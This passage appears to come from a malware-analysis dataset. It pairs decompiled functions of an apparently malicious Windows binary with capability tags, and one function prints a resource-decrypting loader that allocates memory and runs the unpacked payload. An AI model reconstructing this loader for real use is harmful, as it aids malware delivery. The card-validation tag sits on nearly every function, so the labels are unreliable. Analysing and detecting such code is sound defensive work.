        "decompiled_code": "\nuint fcn.00402b70(int32_t param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    if (param_4 != 0) {\n        uVar3 = *(param_1 + 1) % 0x1e97;\n        uVar1 = *(param_1 + 1);\n        *(param_1 + 1) = *(uVar3 + param_1);\n        *(uVar3 + param_1) = uVar1;\n        fcn.0044b81c(uVar3, 0, 0x36b, 0x1561a, 0);\n        uVar2 = fcn.0055ff0d();\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 194
    },
    "00403390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00403390(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    if (param_2 == NULL) {\n        fcn.00401000(0x80004005);\n        param_2 = extraout_ECX;\n    }\n    iVar1 = (**(*param_2 + 0xc))();\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 121
    },
    "004033c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004033c0(int32_t *param_1, int32_t param_2, uint param_3, uint *param_4)\n\n{\n    int32_t iVar1;\n    uint *extraout_ECX;\n    uint *extraout_ECX_00;\n    int32_t unaff_retaddr;\n    \n    if (param_4 == NULL) {\n        fcn.00401000(0x80004005);\n        param_4 = extraout_ECX;\n    }\n    if (unaff_retaddr != 0) goto code_r0x004033f1;\n    if (param_2 == 0) goto code_r0x004033f1;\n    do {\n        fcn.00401000();\n        param_4 = extraout_ECX_00;\ncode_r0x004033f1:\n        iVar1 = (***param_4)(param_2, 1);\n        if (iVar1 == 0) {\n            iVar1 = fcn.004030d0();\n        }\n        *param_1 = iVar1 + 0x10;\n    } while ((param_2 < 0) || (*(iVar1 + 8) < param_2));\n    *(iVar1 + 4) = param_2;\n    *(param_2 + *param_1) = 0;\n    fcn.00410d14(*param_1, param_2, unaff_retaddr, param_2);\n    return param_1;\n}\n",
        "token_count": 326
    },
    "00403510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00403510(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.00410d14(param_1, param_2, param_3, param_4);\n    return param_1;\n}\n",
        "token_count": 60
    },
    "00403540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00403540(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.0040672a();\n    if (piVar1 == NULL) {\n        piVar1 = fcn.00401000(0x80004005);\n    }\n    iVar2 = (**(*piVar1 + 0xc))();\n    *param_1 = iVar2 + 0x10;\n    return param_1;\n}\n",
        "token_count": 118
    },
    "00403610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403610(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    \n    uVar1 = param_2;\n    if (*(param_1 + 0x14) < param_2) {\n        fcn.00427c4a();\n    }\n    uVar2 = *(param_1 + 0x14) - param_2;\n    if (uVar2 < param_3) {\n        param_3 = uVar2;\n    }\n    if (param_3 != 0) {\n        puVar5 = param_1 + 4;\n        puVar4 = puVar5;\n        param_2 = puVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar4 = *puVar5;\n            param_2 = *puVar5;\n        }\n        fcn.00410d91(puVar4 + uVar1, *(param_1 + 0x18) - uVar1, param_2 + param_3 + uVar1, uVar2 - param_3);\n        iVar3 = *(param_1 + 0x14) - param_3;\n        *(param_1 + 0x14) = iVar3;\n        if (0xf < *(param_1 + 0x18)) {\n            puVar5 = *puVar5;\n        }\n        *(iVar3 + puVar5) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 371
    },
    "004037e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004037e0(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403480(*param_2 + -0x10);\n    *param_1 = iVar1 + 0x10;\n    return param_1;\n}\n",
        "token_count": 81
    },
    "004038b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004038b0(int32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t unaff_EDI;\n    uint32_t uVar3;\n    int32_t unaff_retaddr;\n    int32_t in_stack_ffffffec;\n    \n    if (param_3 == 0) {\n        fcn.00403070();\n        return;\n    }\n    if (param_2 != 0) goto code_r0x004038d8;\n    do {\n        fcn.00401000();\n        param_2 = extraout_ECX;\ncode_r0x004038d8:\n        iVar1 = *param_1;\n        uVar2 = *(iVar1 + -0xc);\n        uVar3 = param_2 - iVar1;\n        if ((1U - *(iVar1 + -4) | *(iVar1 + -8) - param_3) < 0) {\n            param_2 = unaff_retaddr;\n            in_stack_ffffffec = param_3;\n            fcn.00403430(param_3, unaff_EDI, unaff_EBP);\n            unaff_retaddr = param_2;\n        }\n        unaff_EBP = unaff_EDI;\n        unaff_EDI = in_stack_ffffffec;\n        iVar1 = *param_1;\n        if (uVar2 < uVar3) {\n            fcn.00410d14(iVar1, *(iVar1 + -8), param_2, param_3);\n        }\n        else {\n            fcn.00410d91(iVar1, *(iVar1 + -8), iVar1 + uVar3, param_3);\n        }\n        in_stack_ffffffec = unaff_EDI;\n    } while ((param_3 < 0) || (*(*param_1 + -8) < param_3));\n    *(*param_1 + -0xc) = param_3;\n    *(param_3 + *param_1) = 0;\n    return;\n}\n",
        "token_count": 478
    },
    "00403a00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403a00(int32_t *param_1, char *param_2, char *param_3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar4;\n    int32_t *unaff_EBX;\n    uint32_t arg_10h;\n    uint32_t uVar5;\n    uint32_t unaff_retaddr;\n    \n    iVar4 = *param_1;\n    uVar3 = *(iVar4 + -0xc);\n    arg_10h = param_2 - iVar4;\n    if (param_3 < 0) {\n        param_2 = fcn.00401000(0x80070057);\n        iVar4 = extraout_ECX;\n    }\n    if (param_2 != NULL) {\n        pcVar1 = param_2 + 1;\n        do {\n            cVar2 = *param_2;\n            param_2 = param_2 + 1;\n        } while (cVar2 != '\\0');\n        param_2 = param_2 + -pcVar1;\n    }\n    if (param_2 < param_3) {\n        param_3 = param_2;\n    }\n    uVar5 = arg_10h;\n    if (uVar3 <= 0x7fffffff - param_3) goto code_r0x00403a54;\n    do {\n        fcn.00401000();\n        iVar4 = extraout_ECX_00;\n        uVar5 = arg_10h;\ncode_r0x00403a54:\n        pcVar1 = param_3 + uVar3;\n        if ((1U - *(iVar4 + -4) | *(iVar4 + -8) - pcVar1) < 0) {\n            fcn.00403430(pcVar1);\n        }\n        arg_10h = unaff_retaddr;\n        if (uVar5 <= uVar3) {\n            arg_10h = uVar5 + *unaff_EBX;\n        }\n        fcn.00410d14(*unaff_EBX + uVar3, param_3, arg_10h, param_3);\n    } while ((pcVar1 < 0) || (*(*unaff_EBX + -8) < pcVar1));\n    *(*unaff_EBX + -0xc) = pcVar1;\n    pcVar1[*unaff_EBX] = '\\0';\n    return;\n}\n",
        "token_count": 558
    },
    "00403ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403ac0(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (param_2 == 0) {\n        fcn.00401000(0x80070057);\n    }\n    iVar2 = fcn.00411292(param_2, param_2);\n    if ((1U - *(*param_1 + -4) | *(*param_1 + -8) - iVar2) < 0) {\n        fcn.00403430(iVar2);\n    }\n    fcn.00411402(*param_1, iVar2 + 1, param_2, param_2);\n    if ((-1 < iVar2) && (iVar2 <= *(*param_1 + -8))) {\n        *(*param_1 + -0xc) = iVar2;\n        *(iVar2 + *param_1) = 0;\n        return;\n    }\n    fcn.00401000(0x80070057);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 249
    },
    "00403cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403cd0(int32_t param_1, int32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    int32_t *arg_8h;\n    int32_t *piVar1;\n    uint32_t arg_14h;\n    \n    if (*(param_2 + 0x14) < param_3) {\n        fcn.00427c4a();\n    }\n    arg_14h = *(param_2 + 0x14) - param_3;\n    if (param_4 < arg_14h) {\n        arg_14h = param_4;\n    }\n    if (param_1 != param_2) {\n        if (arg_14h == 0xffffffff) {\n            fcn.00427c12();\n        }\n        if (*(param_1 + 0x18) < arg_14h) {\n            fcn.004036a0(arg_14h, *(param_1 + 0x14));\n        }\n        else if (arg_14h == 0) {\n            *(param_1 + 0x14) = 0;\n            if (*(param_1 + 0x18) < 0x10) {\n                *(param_1 + 4) = 0;\n                return param_1;\n            }\n            **(param_1 + 4) = 0;\n            return param_1;\n        }\n        if (arg_14h != 0) {\n            if (*(param_2 + 0x18) < 0x10) {\n                param_2 = param_2 + 4;\n            }\n            else {\n                param_2 = *(param_2 + 4);\n            }\n            piVar1 = param_1 + 4;\n            arg_8h = piVar1;\n            if (0xf < *(param_1 + 0x18)) {\n                arg_8h = *piVar1;\n            }\n            fcn.00410d14(arg_8h, *(param_1 + 0x18), param_2 + param_3, arg_14h);\n            *(param_1 + 0x14) = arg_14h;\n            if (0xf < *(param_1 + 0x18)) {\n                piVar1 = *piVar1;\n            }\n            *(piVar1 + arg_14h) = 0;\n        }\n        return param_1;\n    }\n    fcn.00403610(arg_14h + param_3, 0xffffffff);\n    fcn.00403610(0, param_3);\n    return param_1;\n}\n",
        "token_count": 581
    },
    "00403db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00403db0(int32_t param_1, uint *param_2, uint32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *arg_8h;\n    uint *puVar4;\n    int32_t *piVar5;\n    \n    if (param_2 != NULL) {\n        uVar1 = *(param_1 + 0x18);\n        puVar2 = param_1 + 4;\n        puVar4 = puVar2;\n        if (0xf < uVar1) {\n            puVar4 = *puVar2;\n        }\n        if (puVar4 <= param_2) {\n            puVar4 = puVar2;\n            if (0xf < uVar1) {\n                puVar4 = *puVar2;\n            }\n            if (param_2 < *(param_1 + 0x14) + puVar4) {\n                if (0xf < uVar1) {\n                    puVar2 = *puVar2;\n                }\n                iVar3 = fcn.00403cd0(param_1, param_2 - puVar2, param_3);\n                return iVar3;\n            }\n        }\n    }\n    if (param_3 == 0xffffffff) {\n        fcn.00427c12();\n    }\n    if (*(param_1 + 0x18) < param_3) {\n        fcn.004036a0(param_3, *(param_1 + 0x14));\n    }\n    else if (param_3 == 0) {\n        *(param_1 + 0x14) = 0;\n        if (*(param_1 + 0x18) < 0x10) {\n            *(param_1 + 4) = 0;\n            return param_1;\n        }\n        **(param_1 + 4) = 0;\n        return param_1;\n    }\n    if (param_3 != 0) {\n        piVar5 = param_1 + 4;\n        arg_8h = piVar5;\n        if (0xf < *(param_1 + 0x18)) {\n            arg_8h = *piVar5;\n        }\n        fcn.00410d14(arg_8h, *(param_1 + 0x18), param_2, param_3);\n        *(param_1 + 0x14) = param_3;\n        if (0xf < *(param_1 + 0x18)) {\n            piVar5 = *piVar5;\n        }\n        *(piVar5 + param_3) = 0;\n    }\n    return param_1;\n}\n",
        "token_count": 597
    },
    "00403f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00403f30(code **param_1, uint param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t **in_FS_OFFSET;\n    uint32_t *puStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x42a898;\n    puStack12 = *in_FS_OFFSET;\n    puVar1 = *0x435b90 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &puStack12;\n    fcn.00410ba2();\n    *param_1 = vtable.std::runtime_error.0;\n    param_1[8] = NULL;\n    param_1[9] = 0xf;\n    uStack4 = 0;\n    *(param_1 + 4) = 0;\n    fcn.00403cd0(param_2, 0, 0xffffffff);\n    *in_FS_OFFSET = puVar1;\n    return param_1;\n}\n",
        "token_count": 228
    },
    "004051d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004051d0(int32_t **param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack8 = 0x42aa58;\n    piStack12 = *in_FS_OFFSET;\n    uVar2 = *0x435b90 ^ &stack0xffffffec;\n    *in_FS_OFFSET = &piStack12;\n    uStack4 = 0;\n    cVar1 = fcn.00427cf6(uVar2);\n    if (cVar1 == '\\0') {\n        fcn.00405170();\n    }\n    uStack4 = 0xffffffff;\n    if (*(*(**param_1 + 4) + 0x28 + *param_1) != 0) {\n        fcn.00427ae8();\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 223
    },
    "00405670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405670(void)\n\n{\n    uint unaff_retaddr;\n    uint in_stack_00001ea0;\n    uint in_stack_00001ea4;\n    uint in_stack_00001ea8;\n    uint in_stack_00001eac;\n    \n    fcn.00411e80();\n    fcn.00405580(in_stack_00001ea0, *0x10);\n    fcn.00402b70(*0x10, in_stack_00001ea4, in_stack_00001ea8, in_stack_00001eac);\n    fcn.00410f95(unaff_retaddr);\n    return;\n}\n",
        "token_count": 142
    },
    "0040577e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040577e(void)\n\n{\n    code *pcVar1;\n    char16_t *pcVar2;\n    char cVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint uVar9;\n    code *pcVar10;\n    int32_t iVar11;\n    code *unaff_EBP;\n    uint unaff_EDI;\n    uint32_t in_stack_00000010;\n    uint32_t in_stack_0000003c;\n    uint in_stack_0000004c;\n    uint32_t in_stack_00000050;\n    uint32_t in_stack_00000058;\n    uint in_stack_00000068;\n    uint32_t in_stack_0000006c;\n    uint32_t in_stack_00000074;\n    uint in_stack_00000084;\n    uint32_t in_stack_00000088;\n    uint in_stack_00000090;\n    uint32_t in_stack_000000a4;\n    uint uStack140;\n    uint uStack136;\n    code *pcStack132;\n    uchar *puStack128;\n    uint uStack124;\n    char16_t *pcStack120;\n    char *pcStack116;\n    uint uStack112;\n    char16_t *pcStack108;\n    char *pcStack104;\n    uint uStack100;\n    char16_t *pcStack96;\n    char *pcStack92;\n    uint uStack88;\n    char16_t *pcStack84;\n    char *pcStack80;\n    char16_t *pcStack76;\n    char *pcStack72;\n    uchar *puStack68;\n    uchar *puStack4;\n    \n    puStack4 = 0x80000000;\n    func_0x005cd908();\n    func_0x006b1082();\n    func_0x0052ea94();\n    fcn.00402e80();\n    pcVar4 = \"2YPZhNmF2Kkg2KrYsdit2YrY=\";\n    do {\n        cVar3 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar3 != '\\0');\n    puStack68 = &stack0xffffffe0;\n    pcStack72 = &stack0xffffffd4;\n    pcStack76 = 0x4057ee;\n    cVar3 = fcn.00402e20();\n    if (cVar3 != '\\0') {\n        do {\n            uVar5 = fcn.00410b00();\n            puStack68 = 0x40580c;\n            fcn.00411eab(uVar5);\n            uVar6 = fcn.00411ebd();\n            uVar6 = uVar6 & 0x80000003;\n            if (uVar6 < 0) {\n                uVar6 = (uVar6 - 1 | 0xfffffffc) + 1;\n            }\n        } while (uVar6 + 1 < 4);\n        puStack68 = 0x405838;\n        fcn.004040b0();\n        puStack68 = 0x42c818;\n        pcStack72 = 0x405849;\n        fcn.004040b0();\n        pcStack72 = &stack0x0000004c;\n        pcStack76 = &stack0x00000084;\n        pcStack80 = &stack0x00000030;\n        pcStack84 = 0x405863;\n        fcn.004040f0();\n        pcStack72 = \"GetCurrentProcess\";\n        pcStack76 = 0x40587b;\n        fcn.004040b0();\n        pcStack76 = L\"8192\";\n        pcStack80 = 0x405885;\n        uVar6 = fcn.00401080();\n        pcStack80 = \"4096\";\n        pcStack84 = 0x405891;\n        uVar7 = fcn.00401080();\n        pcStack84 = 0x42c7f0;\n        uStack88 = 0x40589d;\n        fcn.00401080();\n        pcVar10 = pcStack84;\n        pcStack84 = 0x4058a3;\n        func_0x00516b23();\n        pcStack72 = \"FindResourceA\";\n        pcStack76 = L\"KERNEL32.DLL\";\n        pcStack80 = 0x4058b6;\n        (*pcVar10)();\n        pcVar2 = pcStack76;\n        pcStack76 = 0x4058bc;\n        pcStack76 = func_0x005fd9ad();\n        pcStack80 = 0x4058bf;\n        (*pcVar2)();\n        pcStack80 = \"LoadResource\";\n        pcStack84 = L\"KERNEL32.DLL\";\n        uStack88 = 0x4058cf;\n        uStack88 = (*pcVar10)();\n        pcStack92 = 0x4058d2;\n        (*pcVar2)();\n        pcStack92 = \"SizeofResource\";\n        pcStack96 = L\"KERNEL32.DLL\";\n        uStack100 = 0x4058e2;\n        uStack100 = (*pcVar10)();\n        pcStack104 = 0x4058e5;\n        (*pcVar2)();\n        pcStack104 = \"LockResource\";\n        pcStack108 = L\"KERNEL32.DLL\";\n        uStack112 = 0x4058f5;\n        uStack112 = (*pcVar10)();\n        pcStack116 = 0x4058f8;\n        pcStack80 = (*pcVar2)();\n        pcStack116 = \"VirtualAlloc\";\n        pcStack120 = L\"KERNEL32.DLL\";\n        uStack124 = 0x405908;\n        uStack124 = (*pcVar10)();\n        puStack128 = 0x40590b;\n        uStack100 = (*pcVar2)();\n        puStack128 = puStack4;\n        if (in_stack_00000010 < 0x10) {\n            puStack128 = &stack0xfffffffc;\n        }\n        pcStack132 = 0x2f6a;\n        uStack136 = 0;\n        uStack140 = 0x40592d;\n        uVar5 = (*pcStack80)();\n        uStack140 = uVar5;\n        uVar8 = (*pcStack96)(0);\n        uVar5 = (*pcStack108)(0, uVar5);\n        uVar9 = (*pcStack120)(uVar8);\n        uVar9 = fcn.00402c90(uVar9, uVar5, &stack0xffffff74);\n        pcVar10 = (*pcStack132)(0, uVar5, uVar7 | uVar6, uStack136);\n        fcn.00405670(*0x435004, uVar9, pcVar10, uVar8);\n        (*pcVar10)();\n        fcn.0040626e(0, 0xffffffff);\n        pcVar10 = NULL;\n        fcn.0040626e(0, 0xffffffff);\n        func_0x00541cba();\n        iVar11 = (*pcVar10)(&stack0xffffffa0, 0, 0, 0);\n        if (iVar11 != 0) {\n            func_0x0053fb17();\n            pcVar1 = *0x42c3b8;\n            do {\n                puStack68 = 0x4059c7;\n                (*unaff_EBP)();\n                puStack68 = &stack0x00000018;\n                pcStack72 = 0x4059ce;\n                (*pcVar1)();\n                pcStack72 = NULL;\n                pcStack76 = NULL;\n                pcStack80 = NULL;\n                pcStack84 = &stack0x00000014;\n                uStack88 = 0x4059d8;\n                iVar11 = (*pcVar10)();\n            } while (iVar11 != 0);\n        }\n        if (0xf < in_stack_00000088) {\n            puStack68 = 0x4059fb;\n            fcn.00405af2();\n        }\n        in_stack_00000088 = 0xf;\n        in_stack_00000084 = 0;\n        in_stack_00000074 = in_stack_00000074 & 0xffffff00;\n        if (0xf < in_stack_00000050) {\n            puStack68 = 0x405a2c;\n            fcn.00405af2();\n        }\n        in_stack_00000050 = 0xf;\n        in_stack_0000004c = 0;\n        in_stack_0000003c = in_stack_0000003c & 0xffffff00;\n        if (0xf < in_stack_0000006c) {\n            puStack68 = 0x405a58;\n            fcn.00405af2();\n        }\n        in_stack_0000006c = 0xf;\n        in_stack_00000068 = 0;\n        in_stack_00000058 = in_stack_00000058 & 0xffffff00;\n        if (0xf < in_stack_000000a4) {\n            puStack68 = 0x405a87;\n            fcn.00405af2();\n        }\n    }\n    fcn.00410f95(unaff_EDI);\n    return;\n}\n",
        "token_count": 2036
    },
    "00405b53": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b53(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint noname_0;\n    \n    noname_0 = fcn.00410d14(arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.00405b03(noname_0, arg_8h);\n    return;\n}\n",
        "token_count": 95
    },
    "00405b74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405b74(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint noname_0;\n    \n    noname_0 = fcn.004121ce(arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.00405b03(noname_0, arg_8h);\n    return;\n}\n",
        "token_count": 94
    },
    "00405d4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint16_t * __cdecl fcn.00405d4b(uint arg_8h, uint arg_ch)\n\n{\n    uint16_t *puVar1;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    puVar1 = fcn.00405bf2(arg_8h, arg_ch);\n    if (puVar1 != NULL) {\n        arg_ch_00 = fcn.00405c4e(puVar1 + 1, *puVar1);\n        arg_8h_00 = fcn.00403590(arg_ch_00);\n        fcn.00405c6a(arg_8h_00, arg_ch_00, puVar1 + 1, *puVar1);\n        fcn.00403020(arg_ch_00);\n        puVar1 = 0x1;\n    }\n    return puVar1;\n}\n",
        "token_count": 199
    },
    "00406056": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406056(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint noname_0;\n    \n    noname_0 = fcn.00410d91(arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.00405b03(noname_0, arg_8h);\n    return;\n}\n",
        "token_count": 94
    },
    "004060a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004060a6(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00405b2f(&var_4h, arg_8h, arg_ch);\n    if (iVar1 < 0) {\n        fcn.00401000(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 94
    },
    "0040626e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040626e(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    arg_ch_00 = arg_8h;\n    iVar2 = 0;\n    if (-1 < arg_8h) goto code_r0x00406286;\n    do {\n        fcn.00405f96();\ncode_r0x00406286:\n        if (iVar2 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_ch_00 == iVar2) {\n            fcn.00406243(*(in_ECX + 4), *(in_ECX + 8));\n            fcn.00405af2(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar2;\n            *(in_ECX + 8) = iVar2;\n            goto code_r0x0040639a;\n        }\n        iVar1 = *(in_ECX + 4);\n        if (iVar1 == iVar2) {\n            arg_8h_00 = fcn.00405ac3(arg_ch_00 << 2);\n            *(in_ECX + 4) = arg_8h_00;\n            fcn.004061e6(arg_8h_00, arg_ch_00);\n            *(in_ECX + 0xc) = arg_ch_00;\ncode_r0x00406307:\n            *(in_ECX + 8) = arg_ch_00;\n            return;\n        }\n        iVar2 = *(in_ECX + 0xc);\n        if (arg_ch_00 <= iVar2) {\n            iVar2 = *(in_ECX + 8);\n            if (iVar2 < arg_ch_00) {\n                fcn.004061e6(iVar1 + iVar2 * 4, arg_ch_00 - iVar2);\n            }\n            else if (arg_ch_00 < iVar2) {\n                fcn.00406243(iVar1 + arg_ch_00 * 4, iVar2 - arg_ch_00);\n            }\n            goto code_r0x00406307;\n        }\n        iVar1 = *(in_ECX + 0x10);\n        if (iVar1 == 0) {\n            iVar1 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar1 < 4) {\ncode_r0x00406339:\n                iVar1 = 4;\n            }\n            else if (iVar1 < 0x401) {\n                if (iVar1 < 4) goto code_r0x00406339;\n            }\n            else {\n                iVar1 = 0x400;\n            }\n        }\n        arg_8h = iVar1 + iVar2;\n        if (iVar1 + iVar2 <= arg_ch_00) {\n            arg_8h = arg_ch_00;\n        }\n    } while (arg_8h < iVar2);\n    iVar2 = fcn.00405ac3(arg_8h << 2);\n    fcn.00405b53(iVar2, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.004061e6(iVar2 + *(in_ECX + 8) * 4, arg_ch_00 - *(in_ECX + 8));\n    fcn.00405af2(*(in_ECX + 4));\n    *(in_ECX + 8) = arg_ch_00;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0040639a:\n    *(in_ECX + 4) = iVar2;\n    return;\n}\n",
        "token_count": 856
    },
    "004063a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004063a4(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    uVar1 = fcn.0040672a();\n    fcn.00403390(uVar1);\n    *(unaff_EBP + -4) = 0;\n    if (0 < *(unaff_EBP + 0xc)) {\n        if (*(unaff_EBP + 8) == 0) {\n            fcn.00401000(0x80070057);\n        }\n        uVar1 = fcn.00405c4e(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        arg_8h_00 = fcn.00403590(uVar1);\n        fcn.00405c6a(arg_8h_00, uVar1, *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        fcn.00403020(uVar1);\n    }\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 329
    },
    "0040690f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040690f(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint noname_0;\n    \n    noname_0 = fcn.0041291c(arg_8h, arg_ch, arg_10h);\n    fcn.00405b03(noname_0, arg_8h);\n    return;\n}\n",
        "token_count": 84
    },
    "00406ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
